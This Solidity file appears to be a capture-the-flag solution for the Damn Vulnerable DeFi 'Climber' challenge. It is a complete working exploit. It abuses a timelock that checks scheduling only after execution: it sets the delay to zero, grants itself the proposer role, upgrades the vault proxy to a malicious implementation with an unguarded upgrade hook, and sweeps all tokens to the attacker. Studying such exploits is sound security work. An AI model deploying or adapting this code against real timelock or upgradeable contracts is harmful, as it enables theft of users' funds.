// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import "hardhat/console.sol";

contract ClimberExploit {
    using Address for address;

    address _gov;
    address _proxy;
    address _token;
    address _owner;
    address _upgrade;

    //variables for calldata
    //we need it in the state, as we cannot schedule the call to the timelock contract itself
    bytes32 salt = keccak256("salt");
    address[] targets;
    uint256[] values;
    bytes[] data;

    constructor(
        address gov_,
        address proxy_,
        address token_
    ) {
        _gov = gov_;
        _proxy = proxy_;
        _token = token_;
        _owner = msg.sender;

        _upgrade = address(new ClimberVaultUpgrade());
    }

    function attack() external {
        /*
            Exploit flow.
            We can unite all execute calls into one call and then schedule it to bypass the guard
            which is beeing checked wrongly at the end of the execute function.
            Calls:
            - update delay to 0
            - grant proposer role to exploit contract
            - upgrade vault to our version and call the sweep function
            - schedule the call, setup it as a callback from exploit contract to break calls cycling
            - execute the stack
        */
        _appendCall(
            _gov,
            0,
            abi.encodeWithSignature("updateDelay(uint64)", uint64(0))
        );

        _appendCall(
            _gov,
            0,
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );

        _appendCall(
            _proxy,
            0,
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                _upgrade,
                abi.encodeWithSignature(
                    "sweep(address,address)",
                    _token,
                    _owner
                )
            )
        );

        _appendCall(
            address(this),
            0,
            abi.encodeWithSignature("scheduleCallback()")
        );

        _gov.functionCall(
            abi.encodeWithSignature(
                "execute(address[],uint256[],bytes[],bytes32)",
                targets,
                values,
                data,
                salt
            )
        );
    }

    function _appendCall(
        address _target,
        uint256 _value,
        bytes memory _data
    ) internal {
        targets.push(_target);
        values.push(_value);
        data.push(_data);
    }

    function scheduleCallback() external {
        _gov.functionCall(
            abi.encodeWithSignature(
                "schedule(address[],uint256[],bytes[],bytes32)",
                targets,
                values,
                data,
                salt
            )
        );
    }

    receive() external payable {}
}

contract ClimberVaultUpgrade is UUPSUpgradeable {
    function sweep(IERC20 token, address attacker) external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
